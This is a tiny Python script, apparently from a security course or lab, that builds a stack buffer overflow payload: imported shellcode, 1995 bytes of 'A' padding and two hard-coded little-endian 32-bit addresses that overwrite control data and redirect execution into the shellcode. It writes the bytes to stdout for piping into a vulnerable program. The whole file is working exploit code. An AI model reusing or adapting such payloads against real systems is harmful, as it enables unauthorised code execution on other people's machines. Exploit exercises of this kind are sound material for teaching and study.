from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + b'A'*1995 +0x08048c80.to_bytes(4,"little") + 0xfff6f0c8.to_bytes(4,"little"))